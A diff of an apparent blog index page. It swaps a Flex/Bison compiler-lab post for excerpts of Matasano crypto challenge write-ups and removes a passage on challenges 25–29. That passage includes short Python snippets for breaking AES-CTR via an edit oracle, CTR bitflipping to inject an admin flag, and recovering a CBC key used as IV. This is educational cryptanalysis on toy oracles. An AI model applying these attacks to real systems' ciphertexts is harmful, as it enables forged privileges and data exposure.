@@ -203,7 +203,7 @@
 
 
   
-    <article id="post-Flex-and-Bison-for-a-simple-language-MITScript"
+    <article id="post-set2_writeup"
    style="margin-top: 0px; margin-bottom: 0px; "
   
   class="article article-type-post" itemscope itemprop="blogPost" >
@@ -217,7 +217,7 @@
         
   
     <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/03/07/Flex-and-Bison-for-a-simple-language-MITScript/">Flex and Bison for a Simple Language, MITScript</a>
+      <a class="article-title" href="/2017/03/07/set2_writeup/">Matasano Crypto Challenges, Set 2</a>
     </h1>
   
 
@@ -225,98 +225,81 @@
     
     <div class="article-meta">
       
-	<a href="/2017/03/07/Flex-and-Bison-for-a-simple-language-MITScript/" class="article-date">
+	<a href="/2017/03/07/set2_writeup/" class="article-date">
 	  <time datetime="2017-03-07T15:38:11.000Z" itemprop="datePublished">03-07-2017</time>
 	</a>
 
       
-    <a class="article-category-link" href="/categories/Languages/">Languages</a>
+    <a class="article-category-link" href="/categories/Crypto/">Crypto</a>
 
     </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>For the first lab in 6.035, Computer Language Engineering, in Spring 2017, we use Flex, a lexical analyzer library, and Bison, a parser generator, to create a parser for a simple scripting language.</p>
-<p>The grammar for the language is shown below.</p>
-<p>&lt;!-- more --&gt;</p>
-<p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">Program ::= Statement*</div><div class="line">Statement ::= Assignment | CallStatement | Global | IfStatement | WhileLoop | Return</div><div class="line">Global ::= 'global' name ';'</div><div class="line">Assignment ::= LHS '=' Expression ';'</div><div class="line">CallStatement ::= Call ';'</div><div class="line">Block ::= '&#123;' Statement* '&#125;'</div><div class="line">IfStatement ::= 'if' '(' Expression ')' Block ( 'else' Block )?</div><div class="line">WhileLoop ::= 'while' '(' Expression ')' Block</div><div class="line">Return ::= 'return' Expression ';'</div><div class="line">Expression ::= Function | Boolean | Record</div><div class="line">Function ::= 'fun' '(' Name* ')' Block</div><div class="line">Boolean ::= Conjunction ( '|' Conjunction )*</div><div class="line">Conjunction ::= BoolUnit ('&amp;' BoolUnit)*</div><div class="line">BoolUnit ::= '!'? Predicate</div><div class="line">Predicate ::= Arithmetic ( ('&lt;' | '&gt;' | '&lt;=' | '&gt;='| '==') Arithmetic)?</div><div class="line">Arithmetic ::= Product ( ('+' | '-') Product)*</div><div class="line">Product ::= Unit ( ('*' | '/') Unit)*</div><div class="line">Unit ::= '-'? (LHS | Constant | Call | '(' Boolean ')' )</div><div class="line">LHS ::= Name ('.' Name | '[' Expression ']' )*</div><div class="line">Call ::= LHS '(' (Expression (',' Expression)*)? ')'</div><div class="line">Record ::= '&#123;' (Name ':' Expression ';')* '&#125;'</div><div class="line">Constant ::= integer_constant | string_constant</div></pre></td></tr></table></figure></p>
-<p>The goal is to construct an Abstract Syntax Tree (AST) for any MITScript program and pretty-print it.</p>
-<p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">Your parser must produce an AST with nodes <span class="keyword">for</span> the following program constructs:</div><div class="line">Block ::= [Statement]</div><div class="line">Global ::= name</div><div class="line">Assignment ::= LHS Expression</div><div class="line">ExpressionStatement ::= Expression <span class="string">';'</span></div><div class="line">IfStatement ::= Condition ThenPart ElsePart</div><div class="line">WhileLoop ::= Condition Body</div><div class="line">Return ::= Expression</div><div class="line">FunctionDeclaration ::= [Arguments] Body</div><div class="line">BinaryExpression ::= LeftOperand Operator RightOperand</div><div class="line">UnaryExpression ::= Operand Operator</div><div class="line">FieldDereference ::= BaseExpression Field</div><div class="line">IndexExpression ::= BaseExpression Index</div><div class="line">Call ::= TargetExpression [Arguments]</div><div class="line">Record ::= Map[String, Expression]</div><div class="line">IntegerConstant</div><div class="line">StringConstant</div><div class="line">NoneConstant</div></pre></td></tr></table></figure></p>
-<h3>Flex</h3>
-<p>How do Flex and Bison work? Much of the lab was reading documentation about these two old utilities.</p>
-<p>Flex takes a <code>.lex</code> file, which simply lists the regular expressions, tokens, and keywords that will be matched in a program.</p>
-<p>When Flex works with Bison, every time it matches a token/keyword, it tells Bison about it. It can return the type of token/keyword to Bison, and it can also return an entire matched string or int in a Bison object it has access to, called <code>yylval</code>.</p>
-<p>Here are examples of both:</p>
-<p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&#123;string_const&#125; &#123;</div><div class="line">		<span class="comment">//Rule for string constant</span></div><div class="line">		yylval-&gt;strType = <span class="keyword">new</span> <span class="built_in">string</span>(yytext);</div><div class="line">		<span class="keyword">return</span> T_STRINGCONST;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="string">"while"</span> &#123;<span class="keyword">return</span> T_WHILE;&#125;</div></pre></td></tr></table></figure></p>
-<p>For us, the lab specifies that: Your lexer must be able to recognize the following kinds of tokens in addition to all the keywords and operators listed above:</p>
-<ul>
-<li>
-<p>integer constants consisting of one or more digits
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int_const [0-9][0-9]*</div></pre></td></tr></table></figure></p>
-</li>
-<li>
-<p>string constants wrapped in double quotes and supporting the following escaped characters: \ &quot; \n \t
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string_const (\&quot;(\\.|[^&quot;])*\&quot;)</div></pre></td></tr></table></figure></p>
-</li>
-<li>
-<p>None constant, equivalent to &quot;NULL&quot; in Java</p>
-</li>
-<li>
-<p>'true' and 'false'
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&quot;None&quot; &#123;return T_NONE;&#125;</div><div class="line">&quot;true&quot; &#123;return T_TRUE;&#125;</div><div class="line">&quot;false&quot; &#123;return T_FALSE;&#125;</div></pre></td></tr></table></figure></p>
-</li>
-<li>
-<p>Name identifiers that start with a letter or underscore, followed by sequence of letters, underscores and numbers. so x0 is a valid variable name, but 0x is not
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">identifier ([a-zA-Z_][a-zA-Z_0-9]*)</div><div class="line">.</div><div class="line">.</div><div class="line">.</div><div class="line">&#123;identifier&#125; &#123;</div><div class="line">	yylval-&gt;strType = new string(yytext);</div><div class="line">	return IDENTIFIER;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-</li>
-</ul>
-<p>The file is compiled in our Makefile with <code>flex --outfile=lexer.cpp --header-file=lexer.h lexer.lex</code>.</p>
-<h3>Bison</h3>
-<p>In the Bison <code>.yy</code> file, we must define several things. First, we must define the union, types, and tokens that Flex and our grammar know about. Then, we need to define our grammar (the most important part!).</p>
-<p>The grammar section of the <code>.yy</code> file contains rules created simply by converting our MITScript to Bison syntax (more on this soon). Each rule is associated with an action, which contains C++ code to be executed when the rule is matched.</p>
-<p>How does this fit into everything else? Well, we have a <code>main.cpp</code> file that will call <code>yyparse</code> on stdin, which will match all the tokens and Bison rules, executing their actions. These actions will construct node objects of an AST, which are defined in <code>AST.h</code>. Then, the <code>main.cpp</code> file will call the pretty print function on the root node, which will recursively print the tree.</p>
-<p>As an example of a rule + action,
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">returnStmt:</div><div class="line">  T_RETURN expr T_SEMICOLON &#123;</div><div class="line">    $$ = new ReturnStatement(*$2);</div><div class="line">  &#125;;</div></pre></td></tr></table></figure></p>
-<p>Above, the T_RETURN and T_SEMICOLON are tokens that correspond to &quot;return&quot; and &quot;;&quot; in our lex file.</p>
-<p>The components matched by the rule can be accessed by <code>$n</code>, which stands for the value of the nth component. The semantic value for the grouping being constructed is <code>$$</code>.</p>
-<p>The ReturnStatement object is an AST node class defined in another file, <code>AST.h</code>, which we'll get to.</p>
-<p>But let me go back to the union. &quot;The %union declaration specifies the entire collection of possible data types for semantic values.&quot; Lexer can access these union fields in <code>yylval</code>.</p>
-<p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">%<span class="keyword">union</span> &#123;</div><div class="line">	<span class="keyword">int</span> intconst;</div><div class="line">  <span class="built_in">string</span> *strType; <span class="comment">// goes with string_const in lex</span></div><div class="line"></div><div class="line">  Block* blockType;</div><div class="line">	Statement* statementType;</div><div class="line">  Expression* expressionType;</div><div class="line"></div><div class="line">  <span class="built_in">vector</span>&lt;Expression*&gt; *exprListType;</div><div class="line">  <span class="built_in">vector</span>&lt;Statement*&gt; *stmtListType;</div><div class="line">  <span class="built_in">vector</span>&lt;<span class="built_in">string</span>*&gt; *stringListType; <span class="comment">//maybe don't need for function declaration list</span></div><div class="line">  <span class="built_in">map</span>&lt;<span class="built_in">string</span>, Expression*&gt; *recordMapType;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>You can see that in my union, I have a bunch of pointers of node types in my AST.</p>
-<p>I can now define <code>%tokens</code>, which are terminals in my grammar (strings, keywords and ints), and <code>%types</code>, which are nonterminals in my grammar. All the tokens are matched and returned in the <code>.lex</code> file.</p>
-<p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">%token&lt;intconst&gt; T_INT</div><div class="line"></div><div class="line">%token&lt;strType&gt; T_SEMICOLON T_LBRACKET  T_RBRACKET  T_LPAREN T_RPAREN T_AND T_OR T_EXCLAM T_LESS_THAN T_GREATER_THAN T_LEQ T_GEQ T_EQEQ T_PLUS T_MINUS T_TIMES T_DIV T_DOT T_EQUALS T_COLON T_LBRACE T_RBRACE T_COMMA</div><div class="line"></div><div class="line">%token &lt;strType&gt; T_FUNCTION T_GLOBAL T_IF T_ELSE T_WHILE T_RETURN T_NONE T_TRUE T_FALSE</div><div class="line">%token &lt;strType&gt; IDENTIFIER T_STRINGCONST</div></pre></td></tr></table></figure></p>
-<p>And nonterminals:</p>
-<p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">%type &lt;statementType&gt; stmt assignment callStmt ifStmt whileLoop returnStmt global Program</div><div class="line"></div><div class="line">%type &lt;blockType&gt; block</div><div class="line"></div><div class="line">%type&lt;stmtListType&gt; stmts</div><div class="line"></div><div class="line">%type &lt;expressionType&gt; expr call boolean function conjunction boolunit predicate arithmetic product unit lhs record constant subunit</div><div class="line"></div><div class="line">%type&lt;exprListType&gt; argument_expr_list  func_declaration_list</div><div class="line"></div><div class="line">%type&lt;recordMapType&gt;  record_init_list</div></pre></td></tr></table></figure></p>
-<p>To enforce left-associativity, I add
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">%left PLUS MINUS</div><div class="line">%left TIMES DIV</div></pre></td></tr></table></figure></p>
-<p>Now for the fun stuff! With all the types I've defined, I need to write grammar rules for all of them.</p>
-<p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Program:</div><div class="line">  %empty &#123;</div><div class="line">    <span class="comment">// printf("Empty program\n");</span></div><div class="line">  &#125;</div><div class="line">  | stmts &#123;</div><div class="line">    $$ = <span class="keyword">new</span> Program(*$<span class="number">1</span>);</div><div class="line">    out = $$;</div><div class="line">  &#125;;</div></pre></td></tr></table></figure></p>
-<p>The highest level, the start Program, can be empty. We assign the Program node to <code>out</code>, which is passed to <code>main.cpp</code> through an argument of <code>yyparse</code>. Note that the skeleton code added some extra stuff to make this necessary/possible; namely, it is needed to make the parser reentrant. The skeleton code constructs are explained in <a href="http://esr.ibiblio.org/?p=6341" target="_blank" rel="external">this great post</a>.</p>
-<p>Much of the translation from BNF grammar to Bison is straightforward. But, when creating variable-length lists, such as function arguments(<code>fun(a b c){}</code>), we have to use a C++ <code>vector</code> and recursively push objects into it.</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">argument_expr_list:</div><div class="line">  %empty &#123;</div><div class="line">    $$ = new ExpressionList();</div><div class="line">  &#125;</div><div class="line">  | expr &#123;</div><div class="line">    $$ = new ExpressionList();</div><div class="line">    $$-&gt;push_back($1);</div><div class="line">  &#125;</div><div class="line">  | argument_expr_list T_COMMA expr &#123;</div><div class="line">    $1-&gt;push_back($3);</div><div class="line">  &#125;;</div></pre></td></tr></table></figure></p>
-<p>In the third rule above, the <code>$3</code> matches the <code>expr</code>, and <code>$1</code> matches the <code>argument_expr_list</code>, which you recall is of type <code>vector&lt;Expression*&gt;</code>.</p>
-<p>The same goes for <code>record</code> rules, which are like Python dicts, and are of type <code>map&lt;string, Expression*&gt;</code>:
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">record:</div><div class="line">  T_LBRACE record_init_list T_RBRACE &#123;</div><div class="line">    // printf(&quot;Parsing\n &quot;);</div><div class="line">    $$ = new Record(*$2);</div><div class="line">  &#125;;</div><div class="line"></div><div class="line">record_init_list:</div><div class="line">  %empty &#123;</div><div class="line">    // printf(&quot;Parsing empty record\n &quot;);</div><div class="line">    $$ = new RecordMap();</div><div class="line">  &#125;</div><div class="line">  | record_init_list IDENTIFIER T_COLON expr T_SEMICOLON &#123;</div><div class="line">    // printf(&quot;Parsing record recursive\n &quot;);</div><div class="line">    $1-&gt;insert(make_pair(*$2, $4));</div><div class="line">  &#125;;</div></pre></td></tr></table></figure></p>
-<p>Note that the default action for a rule is <code>$$ = $1;</code>.</p>
-<p>Running bison with <code>bison --output=parser.cpp --defines=parser.h -v parser.yy</code> will produce several files, including a <code>parser.output</code> file that contains valuable debugging info about our parser, such as the state transition tables.</p>
-<h3>AST Nodes, Visitor pattern pretty-printing, and main (Or, putting it all together)</h3>
-<p>Here's the <code>main.cpp</code> file
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</div><div class="line">  <span class="keyword">void</span>* scanner;</div><div class="line">  yylex_init(&amp;scanner);</div><div class="line">  yyset_in(<span class="built_in">stdin</span>, scanner);</div><div class="line">  Statement* output;</div><div class="line">  <span class="keyword">int</span> rvalue = yyparse(scanner, output);</div><div class="line">  <span class="keyword">if</span>(rvalue == <span class="number">1</span>)&#123;</div><div class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"Parsing failed"</span>&lt;&lt;<span class="built_in">endl</span>;</div><div class="line">	<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  PrettyPrinter printer;</div><div class="line">  output-&gt;accept(printer);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>Each class in my <code>AST.h</code> inherits from <code>Expression</code> or <code>Statement</code>.</p>
-<p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">class</span> Call: <span class="keyword">public</span> Expression &#123;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">	Expression&amp; targetExpr;</div><div class="line">	ExpressionList&amp; argumentsList;</div><div class="line">	Call( Expression&amp; targetExpr, ExpressionList&amp; argumentsList): targetExpr(targetExpr), argumentsList(argumentsList)&#123;&#125;;</div><div class="line">	<span class="function"><span class="keyword">void</span> <span class="title">accept</span><span class="params">(Visitor&amp; v)</span> override </span>&#123;</div><div class="line">		v.visit(*<span class="keyword">this</span>);</div><div class="line">	&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
-<p>The <code>accept</code> function that overrides a virtual method is part of the <a href="https://en.wikipedia.org/wiki/Visitor_pattern" target="_blank" rel="external">Visitor Pattern</a>. Instead of defining a pretty-print method in each of my classes in <code>AST.h</code>, I define a PrettyPrinter class that contains <code>visit(Object&amp; obj)</code> methods for all my nodes. We also need an interface with all our virtual methods in <code>Visitor.h</code>.</p>
-<p><img src="https://upload.wikimedia.org/wikipedia/en/d/d9/UML_diagram_of_an_example_of_the_Visitor_design_pattern.png" alt=""> This diagram explains the Visitor pattern well.</p>
-<p>My <code>PrettyPrinter.h</code> file has recursive calls to each node's <code>accept()</code> method. For example, for a Block, which contains a list of Statements,</p>
-<p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">visit</span><span class="params">(Block&amp; blk)</span> override </span>&#123;</div><div class="line">  PrettyPrinter printer;</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"&#123;"</span>);</div><div class="line">  TABLEVEL++;</div><div class="line">  <span class="keyword">for</span> ( <span class="keyword">auto</span> statement = blk.statements.begin(); statement != blk.statements.end(); statement++ ) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    (*statement)-&gt;accept(printer);</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"\n%s&#125;"</span>, <span class="built_in">string</span>(TABLEVEL<span class="number">-1</span>,<span class="string">'\t'</span>).c_str());</div><div class="line">  TABLEVEL--;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
-<p>I use a global variable <code>TABLEVEL</code> and <code>printf(&quot;\n%s}&quot;, string(TABLEVEL-1,'\t').c_str());</code> to get the correct indentation for the body elements of the block.</p>
-<p>When I print, I wrap all <code>BinaryExpression</code>s and <code>UnaryExpression</code>s in parentheses.</p>
-<p>We can now understand the rest of our <code>Makefile</code>,
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">all: parser.cpp lexer.cpp main.cpp PrettyPrinter.h Visitor.h</div><div class="line">	g++ -g -<span class="built_in">std</span>=gnu++<span class="number">11</span> main.cpp parser.cpp lexer.cpp</div><div class="line"></div><div class="line"></div><div class="line">parser.cpp: parser.yy</div><div class="line">	bison --output=parser.cpp --defines=parser.h -v parser.yy</div><div class="line"></div><div class="line">lexer.cpp: lexer.lex</div><div class="line">	flex  --outfile=lexer.cpp --header-file=lexer.h lexer.lex</div></pre></td></tr></table></figure></p>
-<p>The compiled binary, <code>a.out</code>, will take in a file through a redirect <code>./a.out &lt; tests/good1.mit</code> and pretty-print!</p>
-<h3>Other references</h3>
-<p><a href="http://gnuu.org/2009/09/18/writing-your-own-toy-compiler/3/" target="_blank" rel="external">Here</a> is a complete compiler tutorial that is closer to a real language than most things. Most other Flex/Bison examples are stupid calculators x.x.</p>
-<p><a href="http://aquamentus.com/flex_bison.html" target="_blank" rel="external">This tutorial</a> is very very thorough.</p>
-<p><a href="http://www.lysator.liu.se/c/ANSI-C-grammar-l.html" target="_blank" rel="external">The ANSI C Lex spec</a> and <a href="http://www.lysator.liu.se/c/ANSI-C-grammar-y.html" target="_blank" rel="external">Yacc (old version of Bison) file</a> are helpful in constructing our own grammar and lex rules.</p>
+        <h2>Challenge 9 Implement PKCS#7 padding</h2>
+<p>As the challenge states, &quot;A block cipher transforms a fixed-sized block (usually 8 or 16 bytes) of plaintext into ciphertext. But we almost never want to transform a single block; we encrypt irregularly-sized messages.&quot;</p>
+<p>The PKCS#7 padding scheme will append the number of bytes of padding to the end of the block. I use the pwntools <code>pack()</code> function to pack the number of padding bytes.</p>
+        <!-- Challenge 9 Implement PKCS#7 padding
+As the challenge states, &quot;A block cipher transforms a fixed-sized block (usually 8 or 16 bytes) of plaintext into ciphertext. But we almost never want to t......  -->
+        <p class="article-more-link">
+          <a href="/2017/03/07/set2_writeup/#more">Read More</a>
+        </p>
+      
+    </div>
+    
+      <footer style="border-top:1px solid rgba(208,211,248,0.25)">
+      </footer>
+    
+  </div>
+  
+</article>
 
+
+<!-- Table of Contents -->
+
+
+  
+    <article id="post-set1_writeup"
+   style="margin-top: 0px; margin-bottom: 0px; "
+  
+  class="article article-type-post" itemscope itemprop="blogPost" >
+  <!-- Back button -->
+  
+
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2017/03/07/set1_writeup/">Matasano Crypto Challenges, Set 1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/03/07/set1_writeup/" class="article-date">
+	  <time datetime="2017-03-07T15:38:11.000Z" itemprop="datePublished">03-07-2017</time>
+	</a>
+
+      
+    <a class="article-category-link" href="/categories/Crypto/">Crypto</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2>Challenge 1.1 Convert hex to base64</h2>
+<p>The first challenge is pretty straightforward, using python's built-in functions or <a href="https://github.com/Gallopsled/pwntools">pwntools</a>, as I use heavily in these challenges.</p>
+<p>The functions <code>a2b_hex</code>, <code>unhexlify</code>, and <code>''.decode(&quot;hex&quot;)</code> all do the same thing. They take in an ascii string of the form &quot;[0-9a-f]*&quot; and decode it. The string decodes to
+<code>I'm killing your brain like a poisonous mushroom</code>. We can then use <code>binascii.b2a_base64()</code> to convert the byte string to a base64 representation.</p>
+        <!-- Challenge 1.1 Convert hex to base64
+The first challenge is pretty straightforward, using python's built-in functions or pwntools, as I use heavily in these challenges.
+The functions a2b_hex, unhexl......  -->
+        <p class="article-more-link">
+          <a href="/2017/03/07/set1_writeup/#more">Read More</a>
+        </p>
       
     </div>
     
@@ -367,120 +350,13 @@
         <h2>Challenge 25 Break &quot;random access read/write&quot; AES CTR</h2>
 <p>Because we can seek into the ciphertext and edit arbitrary characters, we we can simply guess each plaintext character.</p>
 <p>For each byte in the ciphertext, I can try all 256 characters by replacing the ciphertext byte with my encrypted guess using the provided <code>edit()</code> function. If the new ciphertext exactly matches the original ciphertext, then I know my guess for the plaintext character is correct, since it encrypted to the same byte.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(ciphertext)):</div><div class="line">  <span class="keyword">for</span> c <span class="keyword">in</span> candidates:</div><div class="line">    new_ciphertext = edit(ciphertext, i, c)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> new_ciphertext[i] == ciphertext[i]:</div><div class="line">      result += c</div></pre></td></tr></table></figure></p>
-<p>&lt;!-- more --&gt;</p>
-<p>My main gripe is that this program is veryyy slow and I'm not sure where the slowdown comes from, but I'm not concerned with optimising right now.</p>
-<h2>Challenge 26 CTR bitflipping</h2>
-<p>CTR is susceptible to an even simpler bitflipping attack than CBC.</p>
-<p>I can simply send in the payload string as before <code>'\x00admin\x00true\x00'</code>, which will be inserted between <code>&quot;&quot;comment1=cooking%20MCs;userdata=&quot; &quot; and &quot;;comment2=%20like%20a%20pound%20of%20bacon&quot;</code> and encrypted.</p>
-<p>I can modify the ciphertext for the block-of-interest directly — I don't even need the previous ciphertext block as in CBC!</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ciphertext[<span class="number">32</span>] = chr(ord(ciphertext[<span class="number">32</span>]) ^ <span class="number">59</span>)</div><div class="line">ciphertext[<span class="number">38</span>] = chr(ord(ciphertext[<span class="number">38</span>]) ^ <span class="number">61</span>)</div><div class="line">ciphertext[<span class="number">43</span>] = chr(ord(ciphertext[<span class="number">43</span>]) ^ <span class="number">59</span>)</div></pre></td></tr></table></figure></p>
-<p>will XOR in the ASCII codes for <code>;</code> and <code>=</code>, so when CTR decryption XORs this ciphertext against the keystream, the desired characters will be left.</p>
-<h2>Challenge 27 Recover the key from CBC with IV=Key</h2>
-<p>Apparently, using the key as an IV is insecure, if an attacker can modify the ciphertext in-flight.</p>
-<p>The challenge instructs us to:</p>
-<p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Use your code to encrypt a message that is at least 3 blocks long:</div><div class="line"></div><div class="line">AES-CBC(P_1, P_2, P_3) -&gt; C_1, C_2, C_3</div><div class="line">Modify the message (you are now the attacker):</div><div class="line"></div><div class="line">C_1, C_2, C_3 -&gt; C_1, 0, C_1</div><div class="line">Decrypt the message (you are now the receiver) and raise the appropriate error if high-ASCII is found.</div><div class="line"></div><div class="line">As the attacker, recovering the plaintext from the error, extract the key:</div><div class="line"></div><div class="line">P'_1 XOR P'_3</div></pre></td></tr></table></figure></p>
-<p>Why does this work? Well, by inserting all <code>\x00</code>'s' in block 2, when we CBC decrypt block 3 of C', we recover the intermediate state of C_1, since we XOR with all <code>\x00</code>. We also have the plaintext of C_1 in the first block. So, we can simply recover the IV by XORing the plaintext with the intermediate state.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">P<span class="string">'_3 ^ IV = P'</span>_1</div><div class="line"></div><div class="line">IV = P<span class="string">'_1 ^ P'</span>_3</div></pre></td></tr></table></figure></p>
-<h2>Challenge 28 Implement a SHA-1 keyed MAC</h2>
-<p>The way a MAC works is described in this diagram off wikipedia:
-<img src="https://upload.wikimedia.org/wikipedia/commons/0/08/MAC.svg" alt="MAC diagram"></p>
-<p>We run the message through the HMAC algo, and send both the message and MAC digest to the receiver. The receiver must verify that the message he received has not been tampered by running it through the same MAC algo, and checking it against the MAC digest he received.</p>
-<p>In this case, our HMAC algo is just secret-prefix, <code>SHA1(key || message)</code>.</p>
-<p>I borrow a SHA1 implementation from https://github.com/ajalt/python-sha1.</p>
-<p>The <code>authsha1(key, data)</code> function produces the MAC digest, and <code>validate_oracle(key, message, digest)</code> checks that the MAC digest of <code>message</code> matches <code>digest</code>.</p>
-<h2>Challenge 29 Break a SHA-1 keyed MAC using length extension</h2>
-<p>This is a cool attack.</p>
-<p>Here's a general idea of how SHA-1 works:</p>
-<p>SHA1 operates on padded data.</p>
-<p>The <a href="https://tools.ietf.org/html/rfc3174" target="_blank" rel="external">RFC</a> explains the padding scheme as follows:</p>
-<blockquote>
-<p>The purpose of message padding
-is to make the total length of a padded message a multiple of 512.
-SHA-1 sequentially processes blocks of 512 bits when computing the
-message digest.</p>
-</blockquote>
-<ol>
-<li>'1' is appended to message.</li>
-<li>'0's are appended, depending on the original length of the message. Leave space for two 4-byte words at the end, so bring up the message to 448 bits (56 bytes).
-We can do that with
